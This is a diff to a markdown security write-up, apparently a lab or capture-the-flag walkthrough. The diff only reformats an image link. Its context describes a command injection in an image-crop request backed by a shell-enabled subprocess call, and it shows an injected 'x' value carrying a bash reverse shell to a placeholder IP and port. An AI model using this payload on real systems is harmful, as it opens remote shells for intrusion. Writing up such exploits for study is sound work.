@@ -154,7 +154,7 @@ subprocess.run(command, capture_output=True, text=True, shell=True)
 
 **Exploit approach:** intercept the crop request and set a parameter to inject a shell payload. Example `x` value used:
 
-![[img4.png|image.png]]
+![image.png](source/img4.png)
 
 ```bash
 "x":";setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'; 
